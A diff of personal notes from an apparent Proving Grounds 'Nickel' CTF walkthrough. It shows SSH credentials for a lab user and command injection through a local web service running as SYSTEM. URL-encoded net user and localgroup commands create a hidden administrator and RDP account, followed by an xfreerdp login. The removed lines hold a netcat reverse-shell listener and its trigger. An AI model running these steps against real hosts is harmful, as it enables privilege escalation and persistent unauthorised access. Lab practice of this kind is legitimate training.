@@ -131,17 +131,40 @@ nice, got it.
     Backup system: http://nickel-backup/backup
     NAS: http://corp-nas/files
     
-    
-great. now to punch through port 80.
 
-    ssh -L 8082:nickel:80 ariah@192.168.59.99
-    NowiseSloopTheory139
+https://medium.com/@Dpsypher/proving-grounds-practice-nickel-f76b06f60db1
+
+so. `curl http://127.0.0.1?whoami` - from the victim's command line - shows `nt authority\system`. I think this is where we need to attack next.
+
+https://meyerweb.com/eric/tools/dencoder/
+
+```sh
+
+ssh ariah@192.168.59.99
+NowiseSloopTheory139
+
+#To create a user named api with a password of Dork123!  
+net user api Dork123! /add  
+  
+#To add to the administrator and RDP groups  
+net localgroup Administrators api /add  
+net localgroup 'Remote Desktop Users' api /add
+
+net%20user%20api%20Dork123!%20%2Fadd  
+  
+net%20localgroup%20Administrators%20api%20%2Fadd  
+  
+net%20localgroup%20%27Remote%20Desktop%20Users%27%20api%20%2Fadd
+
+curl http://127.0.0.1/?net%20user%20api%20Dork123!%20%2Fadd
+
+curl http://127.0.0.1/?net%20localgroup%20Administrators%20api%20%2Fadd
+
+curl http://127.0.0.1/?net%20localgroup%20%27Remote%20Desktop%20Users%27%20api%20%2Fadd
 
 
-and now to start a rev shell listener on our attacker.
+# from attacker
+xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:'api' /p:'Dork123!' /v:NICKEL
 
-    nc -nvlp 4444
-
-and to trigger a connection to it.
-
-    curl localhost:8082/?command=sleep&203
+# got it. SYSTEM flag.
+```
